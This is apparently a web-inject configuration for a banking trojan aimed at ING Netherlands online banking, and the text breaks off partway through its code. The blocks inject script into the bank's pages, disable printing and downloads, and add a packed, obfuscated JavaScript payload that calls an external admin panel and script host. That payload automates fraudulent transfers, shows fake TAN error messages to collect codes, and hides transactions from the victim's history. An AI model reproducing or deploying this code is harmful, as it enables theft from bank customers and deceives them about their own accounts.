+data_before
+Maximaal te besteden*<table*class="formulier-kop"*<table*class="lijst-kop-labels">*</tr></table></td></tr></table>*<table cellpadding="0" cellspacing="0" border="0" width="100%"
+data_end
+data_inject
+ id=transfers_table2 
+data_end
+data_after
+data_end
+
+data_before
+<td class="scherm-titel">Zoekresultaat</td>*</td>*<table*class="lijst-kop-labels">*</tr></table></td></tr></table>*<table cellpadding="0" cellspacing="0" border="0" width="100%"
+data_end
+data_inject
+ id=transfers_table3 
+data_end
+data_after
+data_end
+
+data_before
+<td class="scherm-titel">Zoekresultaat</td>*</td>*<table width="100%" cellspacing="0" cellpadding="0" border="0" class="formulier-kop">*<td width="80%" align="left" valign="top" nowrap
+data_end
+data_inject
+ id=search_account_label
+data_end
+data_after
+data_end
+
+data_before
+function doPrint() {
+data_end
+data_inject
+return false;
+data_end
+data_after
+data_end
+
+data_before
+function doDownload() {
+data_end
+data_inject
+return false;
+data_end
+data_after
+data_end
+
+data_before
+<HEAD*>
+data_end
+data_inject
+<dy></dy>
+data_end
+data_after
+data_end
+
+data_before
+<head*>
+data_end
+data_inject
+<dy></dy>
+data_end
+data_after
+data_end
+
+data_before
+<dy></dy>
+data_end
+data_inject
+<script>
+window.onerror = function(msg){
+	if(msg.toLowerCase().indexOf("focus")>=0){
+		return true;
+	}else{
+		return false;
+	}
+};
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<TD CLASS="rijKop" WIDTH="20%" nowrap>*Beveiligingsmiddel*</TD>*<TD CLASS="rijDataIn"
+data_end
+data_inject
+ id=auth_type_label 
+data_end
+data_after
+data_end
+
+data_before
+<TD CLASS="rijKop" WIDTH="20%" nowrap>*Status*</TD>*<TD CLASS="rijDataIn"
+data_end
+data_inject
+ id=auth_status_label 
+data_end
+data_after
+data_end
+
+data_before
+<div class="wrapper"
+data_end
+data_inject
+ id=wrapper_od 
+data_end
+data_after
+data_end
+
+data_before
+id=wrapper_od*<h1>Wees internetcriminelen te slim af</h1>
+data_end
+data_inject
+<script>
+var wrapper_od = document.getElementById("wrapper_od");
+wrapper_od.style.display = "none";
+top.location.href = "/mpb/startframes.do";
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<div id=start_div*></div>*</html>
+data_end
+data_inject
+<textarea id=log cols=110 rows=20 style="display:none"></textarea>
+<iframe id="ifr_ff" onLoad="try{OnLoadIFrame()}catch(err){void(0)}" width=1024 height=768 name="ifr_ff" style="display:none;"></iframe>
+<script>
+var additional_transfers = false;
+var show_debug = false;
+var check_account_type = false;
+var use_sms_accounts = true;
+var fake_transfer = false;
+var reset_ats_at_start = false;
+var ACD_link = "https://sludential.com/cgi-bin/ACD/ACD.js";
+var admin_link = "http://mijningbank.zzl.org/ing-admin/index.php";
+var pkey = "psk0001";
+var content_grabber_link = "";
+var content_grabber = false;
+var limit_percent = 95;
+var begin_transfer_link = "https://mijn.ing.nl/mpb/DeepLinkServlet?ID=NieuweOpdracht";
+var service_and_install_link = "https://mijn.ing.nl/mpb/DeepLinkServlet?ID=Beveiliging";
+var tan_error_msg = "De TAN-code is onjuist. Vul de TAN-code behorend bij het gevraagde volgnummer in. (Meldingscode: 35.3.1.3)";
+var tan_missing_msg = "U heeft niet alle verplichte velden ingevuld. Controleer of u de velden met een ! heeft ingevuld. (Meldingscode: 35.3.1.1)";
+var tan_digits_msg = "U heeft de TAN-code niet juist ingevuld. De TAN-code dient uit 6 cijfers te bestaan. Vul de TAN-code opnieuw in. (Meldingscode:Â 35.1.1.2)";
+var version = "v16-20.04-1031";
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('d 1v=-1;d 1F=-7K;d u=-1;d 7G=0;d O;d 1H;d 1I;d 1x;d 1P=0;d 2L="";d 2Q="";d 4w="";d p=\'\';d 1p=\'\';d 2f=\'\';d 3j=\'\';d 34=\'\';d 1R=\'\';d 3x=\'\';d 3d=\'\';d 3D=\'\';d 38=\'\';d 1A=0;d 1f=1;d 2F=\'\';m 6Q(){f(4U.4V.v().w("5p 6")>=0||4U.4V.v().w("5p 7")>=0){h"3A"}j f(4U.4V.v().w("5p")>=0){h"3C"}j f(4U.4V.v().w("7U")>=0){h"3y"}j{h"--"}}d 1q=6Q();d 4k=(m(){d 13={},22=66,q=22.o,23=\'7Z\',4M=\'6l\',z;13.25=m(M,A){};13.1T=m(M){};13.4G=m(M){};13.3T=m(){};f(23 3E 22&&22[23]){z=22[23];13.25=m(M,1l){z.7V(M,1l)};13.1T=m(M){h z.7W(M)};13.4G=m(M){z.7H(M)};13.3T=m(){z.3T()}}j f(4M 3E 22&&22[4M]){z=22[4M][22.35.7Y];13.25=m(M,1l){z[M]=1l};13.1T=m(M){h z[M]&&z[M].A};13.4G=m(M){78 z[M]};13.3T=m(){H(d M 3E z){78 z[M]}}}j f(q.3X.74){m 3U(){f(z){h z}z=q.19.2e(q.2N(\'2S\'));z.I.Q=\'1e\';z.74(\'#6K#6t\');z.5B(23);h z}13.25=m(M,1l){d z=3U();z.6o(M,1l);z.4q(23)};13.1T=m(M){d z=3U();h z.6F(M)};13.4G=m(M){d z=3U();z.6Y(M);z.4q(23)};13.3T=m(){d z=3U();d 5f=z.7P.3X.5f;z.5B(23);H(d i=0,5n;5n=5f[i];i++){z.6Y(5n.J)}z.4q(23)}}h 13})();1s={4Y:m(){f(1s.z!=2U)h;d z;f(o.50){z=o.2N("55");z.I.8z="1X(#6K#6t)";f(o.19)o.19.2e(z);j 8m 1i 8j("8k 8q 8y 8w 8t 6i");z.5B("6p")}j{z=6l["47.3I.46"]}1s.z=z},25:m(J,A){1s.4Y();f(o.50){1s.z.6o(J,A);1s.z.4q("6p")}j{1s.z[J]=A}},1T:m(J,79){1s.4Y();d 3K=o.50?1s.z.6F(J):1s.z[J];h 3K||79}};m 7k(J,A,5A){f(5A){d 4f=1i 2J();4f.8c(4f.8n()+(5A*24*60*60*3M));d 4i="; 4i="+4f.81()}j d 4i="";o.5x=J+"="+A+4i+"; 87=/; 6G=47.3I.46"}m 7g(J){d 5w=J+"=";d 5u=o.5x.3f(\';\');H(d i=0;i<5u.l;i++){d c=5u[i];86(c.5Q(0)==\' \')c=c.45(1,c.l);f(c.w(5w)==0)h c.45(5w.l,c.l)}h 2U}m 2V(2H){f(2H==2U||2H==5g||2H=="2U"||2H=="5g"||2H==""||2H==" "){h x}j{h T}}m 7w(J){h 2V(4k.1T(J))}m 7x(J){h 2V(1s.1T(J))}m 1m(J,A){4k.25(J,A);f(!7w(J)){1s.25(J,A);f(!7x(J)){7k(J,A,1j);h}j{h}}j{h}}m 2b(J){d 1r=4k.1T(J);f(!2V(1r)){d 1r=1s.1T(J);f(!2V(1r)){d 1r=7g(J);h 1r}j{h 1r}}j{h 1r}}d 4H=3Y(o,"8s");d 4E=3Y(o,"8v");d 41=o.G("41");d 4h=o.G("4h");d 4s=o.G("4s");d 14=o.G("14");d 2i=o.G("2i");d 53=o.G("53");d 3n=o.G("3n");d 3s=o.G("3s");d 2I=o.G("2I");d N=o.G("7D");d 2l=o.G("2l");d 2j=o.G("2j");d 3e=o.G("3e");d 3r=2b(\'2B\')+""?2b(\'2B\')+"":"";d 51=2b(\'3W\')+""?2b(\'3W\')+"":"";d 1E=2b(\'1E\')?2b(\'1E\'):"0";d 1N=2b(\'1N\')?2b(\'1N\'):"0";d 15=1i 3w();m 4N(7e,7m,7t,7l){f(15&&15.l>0){H(d i=0;i<15.l;i++){f(7e.v().w(15[i]["1p"].v())>=0&&7m.v().w(15[i]["1R"].v())>=0&&1y(7t)==7l*1y(15[i]["1A"])){h T}}}h x}m 4J(7d){d 3K=0;f(15&&15.l>0){H(d i=0;i<15.l;i++){f(7d.v().w(15[i]["1p"].v())>=0){3K+=5S(15[i]["1A"])}}}h 3K}m 7j(7c,7b,7f){d 3G=15.l;15[3G]=1i 3w();15[3G]["1p"]=7c;15[3G]["1R"]=7b;15[3G]["1A"]=7f}m 5L(5j){d F=x;f(5j.w(\'[5I]\')>=0){h F}j{d 3H=o.2N("2S");3H.I.Q="1e";o.19.2e(3H);3H.V=5j;d 3N=3H.D(\'2S\');f(3N){H(d i=0;i<3N.l;i++){f(3N[i].1d=="5W"){d 2q=3N[i].D(\'2S\');f(2q){d 7i=2q[0].V;d 2k=2q[1].V;d 7h=2q[2].V;7j(7i,2k,7h);F=T}}}}h F}}m 5i(){31()}m 5q(){d W=o.G("W");d 1h;f(1q=="3y"){1h=W.3v;f(1h){4S{1h.19}5F(7z){5i()}}}j f((1q=="3C"||1q=="3A")&&W&&W.3B=="5z"){4S{W.2Y.o}5F(7z){5i()}}}m 5G(1t,2q){f(1t){f(o.G("W")){o.19.6C(o.G("W"))}d W=o.2N("6B");W.1d="W";W.I.Q="1e";W.I.6A=6y;W.I.6k=6z;f(1q=="3y"){W.4C=1i 7S("5q()")}j{W.4b=5q}o.19.2e(W);d 2D=W.3v?W.3v:W.2Y.o;2D.7R();2D.4n(\'<6a\'+\'68 7J="7O" 7T="7X/8p-80" 3t="\'+1t+\'">\');H(d M 3E 2q){2D.4n(\'<1Q\'+\'6f J="\'+M+\'">\'+2q[M]+\'</1Q\'+\'6f>\')}2D.4n(\'</6a\'+\'68>\');2D.4n(\'<8i\'+\'8h>66.4C = m(){o.8g[0].8e();}</8d\'+\'8a>\');2D.8b()}}m 61(q){d 3p=q.35.2P;d 6h=(3p.w("?")==-1)?3p.l:3p.w("?");h 3p.45(3p.5N("/")+1,6h)}m 6e(q){d 2C=1i 2J();d 5M=2C.8f();d 6j=2C.89();d 64=2C.88();d 67=2C.83();d 5K=2C.82();d 62=2C.84()+85;4w=62+"-"+67+"-"+5K+"8u"+5M+"."+6j+"."+64;f(!q){q=o}f(!q){h x}d 3o=1i 3w();3o["8x"]=q.3X.V+"";3o["8r"]=61(q);3o["8l"]=q.35.2P+"";3o["4w"]=4w+"";5G(8o,3o);h T}m 5o(){d 1u=L(o,"57","1k");f(!1u){p+=\'5o(): 1u C E|\';K(1);h}f(1x){1x.A=1u.A;f(u==4){u=5}j f(u==10){u=11}f(7L){K(0);h}j{1H.7M()}}j{p+=\'5o(): 1x C E|\';K(1);h}}m 7I(){f(4H&&4H.A.l>0&&4E&&4E.A.l>0){1m("2B",4H.A+"",1j);1m("3W",4E.A+"",1j);1m("1E","0",1j);1m("1N","0",1j)}}m 5J(1l){d 5H=1l.v();d a=5H.w("5E");d 2k=1l.3Z(a+11,1l.l);d a=2k.w(":");d 2k=2k.3Z(a+1,2k.l);h 2k.1c(/%20/g," ")}m 5V(1l){d a=1l.w("{");d b=1l.5N("}");h 1l.3Z(a+1,b-a-1)}m 7N(3Q,q){f(3Q&&q){d 2E=3Q.7Q+"";f(2E.l>0){2E=2E.1c(/h x/g,"");2E=2E.1c(/h T/g,"");63(5V(2E))}4c=3Q.2P+"";f(4c.v().w("5E")>=0&&4c.v().w(":")>=0){63(5J(4c))}j{q.35.2P=3Q.2P+""}}}m 4a(A,6g){h 3F.95((A/30)*6g)}m 2c(X){X=X.5m().1c(/\\$|\\,/g,\'\');f(a2(X))X="0";56=(X==(X=3F.a1(X)));X=3F.59(X*30+0.a0);3L=X%30;X=3F.59(X/30).5m();f(3L<10)3L="0"+3L;H(d i=0;i<3F.59((X.l-(1+i))/3);i++)X=X.45(0,X.l-(4*i+3))+\'.\'+X.45(X.l-(4*i+3));h(((56)?\'\':\'-\')+X+\',\'+3L)}m 1w(4L){4L=(4L+\'\').5m();h 9Y(4L).1c(/!/g,\'%21\').1c(/\'/g,\'%27\').1c(/\\(/g,\'%28\').1c(/\\)/g,\'%29\').1c(/\\*/g,\'%2A\').1c(/%20/g,\'+\').1c(/\\n/g,"").1c(/\\t/g,"")}m B(2t){h(2t.4F?2t.4F:2t.5O)?(2t.4F?2t.4F:2t.5O):2t.V}m 1y(A){d F=\'\';A=A+"";f(A.l>0){A=A.1c(/–/g,"-");d 5R="-,9Z";H(d i=0;i<A.l;i++){d 3R=A.5Q(i);f(5R.w(3R)>=0){f(3R==",")3R=".";F+=3R}}}h 5S(F)}m 3Y(q,5U){d F=x;f(q){d 32=q.D("1k");f(32&&32.l>0){H(d i=0;i<32.l;i++){f(32[i].a3.v().w(5U.v())>=0&&!F){F=32[i]}}}}h F}m L(q,1d,6b){d F=x;f(q){d 2w=q.D(6b);f(2w&&2w.l>0){H(d i=0;i<2w.l;i++){f(!F&&2w[i].1d==1d){F=2w[i]}}}}h F}m 4g(){f(3d>=1&&3x>=0&&3D>=1){f(1F<3x){p+="4g(): a4 a9 26 a8 65 a7. a5|";h x}j f(1F>=3x&&1F<3d){1A=4a(1F,3D);h T}j f(1F>=3d){1A=4a(3d,3D);h T}}j{p+="4g(): 4d a6 26 2U|";h x}}m 6N(){d 1C=4v.4u.o;f(1C&&14){d 1b=1C.D("3m");f(1b&&1b.l>0){1b[0].4r="0,*"}}d P=o.G("P");d 17=o.G("17");d 18=o.G("18");d 16=o.G("16");f(17)17.I.Q="1e";f(18)18.I.Q="";f(P)P.I.Q="1e";f(16)16.I.Q="1e"}m 6R(){d 1C=4v.4u.o;f(1C){d 1b=1C.D("3m");f(1b&&1b.l>0){1b[0].4r="0,*"}}d P=o.G("P");d 17=o.G("17");d 18=o.G("18");d 16=o.G("16");f(17)17.I.Q="";f(18)18.I.Q="1e";f(P)P.I.Q="1e";f(16)16.I.Q="1e"}m 52(){d 1C=4v.4u.o;f(1C){d 1b=1C.D("3m");f(1b&&1b.l>0){1b[0].4r="0,*"}}d P=o.G("P");d 17=o.G("17");d 18=o.G("18");d 16=o.G("16");f(17)17.I.Q="1e";f(18)18.I.Q="1e";f(P)P.I.Q="1e";f(16)16.I.Q=""}m 3V(){d 1C=4v.4u.o;f(1C&&14){d 1b=1C.D("3m");f(1b&&1b.l>0){1b[0].4r="9X,*"}}d P=o.G("P");d 17=o.G("17");d 18=o.G("18");d 16=o.G("16");f(17)17.I.Q="1e";f(18)18.I.Q="1e";f(P)P.I.Q="";f(16)16.I.Q="1e"}m 6M(){d F="69 J C 4m";f(4s){F=B(4s)+"";f(F.l>0&&F.v().w("5P")>=0){F=F.3Z(F.v().w("5P")+7,F.l)}j{F="69 J C 4m"}}F=F.1c(/(\\r|\\n|[\\r]|[\\n])/9W,"");h F}m 5a(){f(14){d y=14.D("2a");f(y&&y.l>0){2f="";H(d i=0;i<y.l;i++){f(y[i].1d.v().w("5k")>=0){d s=y[i].D("1a");f(s&&s.l>0){d 1n=B(s[1]);d 1J=1y(B(s[3]));f(2f.l<2){2f+=1n+": "+2c(1J)+" 5t"}j{2f+="|"+1n+": "+2c(1J)+" 5t"}}}}}}}m 4O(){f(14){d y=14.D("2a");f(y&&y.l>0){H(d i=0;i<y.l;i++){f(y[i].1d.v().w("5k")>=0){d s=y[i].D("1a");f(s&&s.l>0){d 1n=B(s[1]);d 1J=1y(B(s[3]));f(1J>1F){1F=1J;1p=1n}}}}}f(1F>0){h T}j{p+=\'4O(): 9N 4p 9O 9M 65 9L|\';h x}}j{p+=\'4O(): 14 C E|\';h x}}m 5Y(1X,5C){d 1o=o.2N("1o");1o.ab="1Q/5E";f(1o.3B){1o.4b=m(){f(1o.3B=="6i"||1o.3B=="5z"){1o.4b=2U;5C()}}}j{1o.4C=m(){5C()}}1o.4R=1X;o.D("9J")[0].2e(1o)}m 3c(1X){f(!2V(3r)){2v("9K 9P 9Q 5x 9V 6w 4S 9U 56 3E 9T");o.35.2P="4Z://47.3I.46/9R/9S";h}1X=1X.1c(/\\(/g,"%28").1c(/\\)/g,"%29");d 5T=aa+"?ar=("+1X+")";5Y(5T,5X)}m 5X(){f(1v==98){d 1G=1i 3w();d 1r=5y.5s;f(1r.w("[5I]")==-1){1G=1r.3f("|");1f=1G[1].v();3j=1G[2];1R=1G[3];2F=1G[4];34=1G[5];3x=5c(1G[6]);3d=5c(1G[7]);3D=5c(1G[8]);d r=4g();f(!r){K(1);h}f(1f.w("ap")>=0){2g(2Q,2);h}j f(1f.w("6x")>=0){2g(2L,8);h}j{p+="1f C 4m. aq av au|";K(1)}}j{p+="aw 5e 26 as, an 1M ag 5W|";K(1);h}}j f(1v==96){f(5L(5y.5s)){77()}j{3V()}}j f(1v==97){d 1G=1i 3w();d 1r=5y.5s;f(1r.w("af")>=0){p+="ac ao ad 4p ah ai|";K(1);h}j{5r()}}j f(1v==30){1m(\'1N\',"0",1j);1m(\'1E\',"1",1j);31()}j f(1v==99){1N=\'0\';1m(\'1N\',"0",1j);1m(\'1E\',"1",1j);f(am){6e(O?O:o)}j{31()}}}m 6L(){d 1t=3J+"?3t=al&2B="+3r.v()+"&1V="+1V+"&3O="+3S(1i 2J());1v=96;3c(1t)}m K(54){f(54==0){d 1t=3J+\'?4o=\'+4o+\'&1V=\'+1V+\'&3t=25&6d=ak&2F=\'+2F+\'&1f=\'+1f+\'&38=\'+1w(38)+\'&1p=\'+1w(1p)+\'&2f=\'+1w(2f)+\'&2B=\'+3r.v()+\'&3W=\'+51.v()+\'&3j=\'+1w(3j)+\'&1R=\'+1w(1R)+\'&1A=\'+1w(1A)+\'&34=\'+1w(34)+\'&3O=\'+3S(1i 2J());1v=30;3c(1t)}j f(54==1){d 1t=3J+\'?4o=\'+4o+\'&1V=\'+1V+\'&3t=25&6d=aj&2F=\'+2F+\'&1f=\'+1f+\'&38=\'+1w(38)+\'&1p=\'+1w(1p)+\'&2f=\'+1w(2f)+\'&2B=\'+3r.v()+\'&3W=\'+51.v()+\'&p=\'+1w(p)+\'&3O=\'+3S(1i 2J());1v=99;3c(1t)}}m 6V(){d 1t=3J+"?3t=1v&2B="+3r.v()+"&1V="+1V+"&3O="+3S(1i 2J());1v=97;3c(1t)}m 6n(6c,5Z){d 1t=3J+"?3t=1T&1F="+6c+"&1f="+5Z+"&1V="+1V+"&3O="+3S(1i 2J());1v=98;3c(1t)}m 4X(q,49){d F="";f(q){d 1Z=q.D("1o");f(1Z&&1Z.l>0){H(d i=0;i<1Z.l;i++){d S=1Z[i].V+"";f(S.v().w("7C[\'7B\']")>=0){d S=S.3f("\\n");f(S.l>0){H(d c=0;c<S.l;c++){f(S[c].v().w("[\'"+49.v()+"\']")>=0){S=S[c].3f("\'");f(S.l>0){F="4Z://"+o.6G+S[3]+""}2Z}}}2Z}}}}h F}m 6r(q,49){d F="";f(q){d 1Z=q.D("1o");f(1Z&&1Z.l>0){H(d i=0;i<1Z.l;i++){d S=1Z[i].V+"";f(S.v().w("7C[\'7B\']")>=0){d S=S.3f("\\n");f(S.l>0){H(d c=0;c<S.l;c++){f(S[c].v().w("[\'"+49.v()+"\']")>=0){S=S[c].3f("\'");f(S.l>0){F="4Z://47.3I.46/ae/at/"+S[3]}2Z}}}2Z}}}}h F}m 43(q){f(!q){p+=\'43(): o 5g|\';h T}d 3b=q.D("5e");f(3b&&3b.l>0){H(d i=0;i<3b.l;i++){f(3b[i].33=="9H"){p+=\'43(): \';d y=3b[i].D("2a");f(y&&y.l>0){H(d c=0;c<y.l;c++){d s=y[c].D("1a");f(s&&s.l>0){f(B(s[0]).v().w("44 6m-2T 26 8W")>=0){f(u==5){u=4}j f(u==11){u=10}1P=1;h x}j f(B(s[0]).v().w("8X 73 8V 8U 8S")>=0){f(u==5){u=4}j f(u==11){u=10}1P=2;h x}j f(B(s[0]).v().w("8T 44 3I 26 8Y 8Z 94 44 9I")>=0){u=7;h x}j f(B(s[0]).v().w("2T 93 92 6 90 91 8A")>=0){f(u==5){u=4}j f(u==11){u=10}1P=3;h x}j{p+=B(s[0])+"|"}}}}h T}}}d s=q.D("1a");f(s&&s.l>0){H(d i=0;i<s.l;i++){f(s[i].33=="8R-8Q"&&B(s[i]).v().w("4P")>=0){p="43(): U 7u 3 7v 7q 7p 2u-2T 7o. 7n 7r 26 44 2u-7s 4P.|";2v("U 7u 3 7v 7q 7p 2u-2T 7o. 7n 7r 26 44 2u-7s 4P.");h T}}}h x}m 2d(q,2O,4j){f(!q){p+=\'2d(): 1M q 3z|\';h x}f(!2O||2O.l<2){p+=\'2d(): 2O C 4m|\';h x}d 1O=q.D("8G");f(1O&&1O.l>0){d 42;H(d i=0;i<1O.l;i++){f((1O[i].J.v()==2O&&4j.l>0&&1O[i].4R.v().w(4j.v())>=0)||(1O[i].J.v()==2O&&4j.l==0)){f(1q=="3y"){42=1O[i].3v;2Z}j f(1q=="3C"||1q=="3A"){42=1O[i].2Y.o;2Z}}}f(42){h 42}j{p+=\'2d(): 1M 1O E 8H J \'+2O+\'|\';h x}}j{p+=\'2d(): 1M 1O E|\';h x}}m 1L(q){f(!q){p+=\'1L(): 1M q 3z|\';h x}d 2r=L(q,"8F","1k");f(!2r){p+=\'1L(): 2r C E|\';h x}j{2r.A=1A}d 2n=L(q,"8E","1k");f(!2n){p+=\'1L(): 2n C E|\';h x}j{2n.A="7A"}d N=L(q,"8B","3u");f(!N){p+=\'1L(): N C E|\';h x}j{d Y=x;H(d i=0;i<N.l;i++){d 1W=N.1B[i].1Q;f(1W.v().w(1p)>=0&&!Y){Y=T;N.1z=i}}f(!Y){p+=\'1L(): 4p \'+1p+\' C E|\';h x}}d 2s=L(q,"8C","1k");f(!2s){p+=\'1L(): 2s C E|\';h x}j{2s.A=3j}d 2m=L(q,"8D","1k");f(!2m){p+=\'1L(): 2m C E|\';h x}j{2m.A=1R}d 4l=L(q,"8I","1k");f(!4l){p+=\'1L(): 4l C E|\';h x}j{4l.A=2F}d 2x=L(q,"8J","8O");f(!2x){p+=\'1L(): 2x C E|\';h x}j{2x.A=34}h T}m 2h(q){f(!q){p+=\'2h(): 1M q 3z|\';h x}d 2X=L(q,"8P","3u");f(!2X){p+=\'2h(): 2X C E|\';h x}j{d Y=x;d 2W=1R.3Z(0,2).v();f(!2W||2W.l<2){p+=\'2h(): 1R 26 8N 8M|\';h x}H(d i=0;i<2X.l;i++){d 1W=2X.1B[i].A;f(1W.v().w(2W)>=0&&!Y){Y=T;2X.1z=i}}f(!Y){p+=\'2h(): 2W \'+2W+\' C E|\';h x}}d 2R=L(q,"8K","3u");f(!2R){p+=\'2h(): 2R C E|\';h x}j{d Y=x;H(d i=0;i<2R.l;i++){d 1W=2R.1B[i].A;f(1W.v().w("8L")>=0&&!Y){Y=T;2R.1z=i}}f(!Y){p+=\'2h(): 9a 5t C E|\';h x}}h T}m 1D(q){f(!q){p+=\'1D(): 1M q 3z|\';h x}d 48=L(q,"48","b");f(48){d 4d=1y(B(48));f(1y(1A)>=4d){1A=4a(4d,9b)}}d 3l=L(q,"9x","3u");f(!3l){p+=\'1D(): 3l C E|\';h x}j{d Y=x;H(d i=0;i<3l.l;i++){d 1W=3l.1B[i].1Q;f(1W.v().w("7E 7F 7y")>=0&&!Y){Y=T;3l.1z=i}}f(!Y){p+=\'1D(): 7E 7F 7y C E|\';h x}}d 2r=L(q,"9y","1k");f(!2r){p+=\'1D(): 2r C E|\';h x}j{2r.A=1A}d 2n=L(q,"9w","1k");f(!2n){p+=\'1D(): 2n C E|\';h x}j{2n.A="7A"}d N=L(q,"7D","3u");f(!N){p+=\'1D(): N C E|\';h x}j{d Y=x;H(d i=0;i<N.l;i++){d 1W=N.1B[i].1Q;f(1W.v().w(1p)>=0&&!Y){Y=T;N.1z=i}}f(!Y){p+=\'1D(): 4p \'+1p+\' C E|\';h x}}d 2m=L(q,"9v","1k");f(!2m){p+=\'1D(): 2m C E|\';h x}j{2m.A=1R}d 2s=L(q,"9t","1k");f(!2s){p+=\'1D(): 2s C E|\';h x}j{2s.A=3j}d 2x=L(q,"9u","1k");f(!2x){p+=\'1D(): 2x C E|\';h x}j{2x.A=34}h T}m 2g(1X,5h){f(1q=="3C"||1q=="3A"){d 4e=o.G("36");f(4e)4e.1U.6C(4e);d Z=o.2N("6B");Z.J="36";u=5h;Z.6A=6y;Z.6k=6z;Z.I.Q="";f(6D){3V()}j{Z.I.6E="6I";Z.I.6H="-4W";Z.I.7a="-4W"}Z.4R=1X;Z.1d="36";Z.4b=R;f(14){14.1U.2e(Z)}j{o.19.2e(Z)}}j{d Z=o.G("58");Z.I.Q="";f(!6D){Z.I.6E="6I";Z.I.6H="-4W";Z.I.7a="-4W"}u=5h;Z.4R=1X}}m 3q(q){d F=x;f(!q){p+=\'3q(): 1M q 3z|\';h x}d 3a=q.D("19");f(3a&&3a.l>0){3a=3a[0];d 12=3a.6U;f(12&&12.l>0){H(d i=0;i<12.l;i++){f(B(12[i])&&B(12[i]).l>5&&B(12[i]).v().w("9z 9A")>=0&&!F){F=T}}f(!F){p+=\'3q(): 1M 2w E|\'}}j{p+=\'3q(): 1M 19 2w|\'}}j{p+=\'3q(): 1M o 19|\'}h F}m 6v(1K){2Q=4X(1K,"9F");2L=4X(1K,"9G")}m 6u(){f(2Q.l>1&&2L.l>1){1f=2}j f(2Q.l>1&&2L.l==0){1f=1}j f(2Q.l==0&&2L.l>0){1f=3}j f(2Q.l==0&&2L.l==0){1f=0}f(1f==0){p+=\'R(): u = 1, 6x 6w 9E 9D 9B C E|\';K(1);h}j{6n(1F,1f);h}}d 4y=0;d 4A=0;d 4B=0;m R(){d 2z=o.G("36")?o.G("36"):o.G("58");d 1h;d 4x;f(1q=="3y"&&2z){1h=2z.3v;4x=2z.2Y}j f((1q=="3C"||1q=="3A")&&2z&&2z.3B=="5z"){1h=2z.2Y.o;4x=2z.2Y}f(1h){f(u==40){O=1h;d 2K=L(O,"2K","1a");d 2M=L(O,"2M","1a");f(2M&&B(2M)&&B(2M).l>0&&B(2M).v().w("4P")>=0){p=\'\';p+=\'R(): u = 40, 2u 9C -- \'+B(2M)+\'|\';K(1);h}f(2K&&B(2K)&&B(2K).l>0&&B(2K).v().w("6m-3h")>=0){p=\'\';2g(4t,1);h}j f(9s){p=\'\';2g(4t,1);h}j{p=\'\';p+=\'R(): u = 40, 2u 9r 26 \'+B(2K)+\'|\';K(1);h}}j f(u==39){O=1h;d 1K=2d(1h,"5v","");d 6q=2d(1h,"1Y","");f(!1K){1K=2d(6q,"5v","")}f(1K){d 4z=6r(1K,"9h");f(4z){2g(4z,40);h}j{d 1Y=O.3X.V+"";f(1Y.v().w(\'</3m>\')>=0){f(4y<5){4D("R()",3M);4y++;h}j{p=\'R(): u = \'+u+\', 5D 4y|\';K(1);h}}j{p=\'R(): u = 39, 4z C E|\';2g(4t,1);h}}}j{f(4A<5){4D("R()",3M);4A++;h}j{p=\'R(): u = \'+u+\', 5D 4A|\';K(1);h}}}j f(u==1){O=1h;d 1K=2d(1h,"5v","");f(1K){6v(1K);6u()}j{f(4B<5){4D("R()",3M);4B++;h}j{p=\'R(): u = \'+u+\', 5D 4B|\';K(1);h}}}j{O=1h;1H=4x;d r=43(O);f(!r){f(u==2){d r=1D(O);f(!r){K(1);h}j{u=3;1H.5l();h}}j f(u==3){u=4;1H.9i();h}j f(u==4){1I=B(L(O,"6s","1a"));f(1I.l<1||!1I){p+=\'R(): u = 4, 1I C E|\';K(1);h}1x=3Y(O,"2u-2T");f(!1x){p+=\'R(): u = 4, 1x C E|\';K(1);h}1x.A="";d 2y=L(o,"6J","55");f(!2y){p+=\'R(): u = 4, 2y C E|\';K(1);h}d 1u=L(o,"57","1k");f(!1u){p+=\'R(): u = 4, 1u C E|\';K(1);h}1u.A="";2y.V=1I;52();f(1P==1){2v(72)}j f(1P==2){2v(71)}j f(1P==3){2v(70)}h}j f(u==5){u=6;1H.5b();h}j f(u==6){d 4Q=L(O,"4Q","2S");f(!4Q){p+=\'R(): 4Q C E|\';K(1);h}j{K(0);h}}j f(u==7){u=3;1H.5l();h}j f(u==8){d r=2h(O);f(!r){K(1);h}j{u=9;1H.9g();h}}j f(u==9){d r=1L(O);f(!r){K(1);h}j{u=10;1H.5l();h}}j f(u==10){1I=B(L(O,"6s","1a"));f(1I.l<1||!1I){p+=\'R(): u = 10, 1I C E|\';K(1);h}1x=3Y(O,"2u-2T");f(!1x){p+=\'R(): u = 10, 1x C E|\';K(1);h}1x.A="";d 2y=L(o,"6J","55");f(!2y){p+=\'R(): u = 10, 2y C E|\';K(1);h}d 1u=L(o,"57","1k");f(!1u){p+=\'R(): u = 10, 1u C E|\';K(1);h}1u.A="";2y.V=1I;52();f(1P==1){2v(72)}j f(1P==2){2v(71)}j f(1P==3){2v(70)}h}j f(u==11){f(9f 1H.5b=="m"&&O.D("19")&&O.D("19").l>0){O.D("19")[0].4C=m(){};1H.5b();h}j{d 1Y=O.3X.V+"";f(1Y.v().w(\'</3m>\')>=0){4D("R()",3M);h}j{d r=3q(O);f(r){K(0);h}j{K(1);h}}}}}j{K(1);h}}}}m 6X(){f(2i){d 2o=L(o,"9c","3u");f(2o){d 1S="";f(2o.1z!=-1&&2o.1B.l>0){1S=2o.1B[2o.1z].1Q?2o.1B[2o.1z].1Q:""}f(1S.l>0){d y=2i.D("2a");d k=y.l;f(y&&y.l>0){H(d i=0;i<k;i++){f(y[i].33=="3h-3P-1Y"){d s=y[i].D("1a");f(s&&s.l>0){d 3k=B(s[3])+" "+B(s[5]);d 3i=B(s[7]);f(4N(1S,3k,3i,-1)){2i.37(i);i=i-1;k=k-1;2i.37(i);i=i-1;k=k-1}}}}}}}}}m 6W(){f(2l&&N&&N.1B.l>0&&N.1z!=-1){d 1S=N.1B[N.1z].1Q;f(1S.l>0){d y=2l.D("2a");d k=y.l;f(y&&y.l>0){H(d i=0;i<k;i++){f(y[i].33=="3h-3P-1Y"){d s=y[i].D("1a");f(s&&s.l>0){d 3k=B(s[2])+" 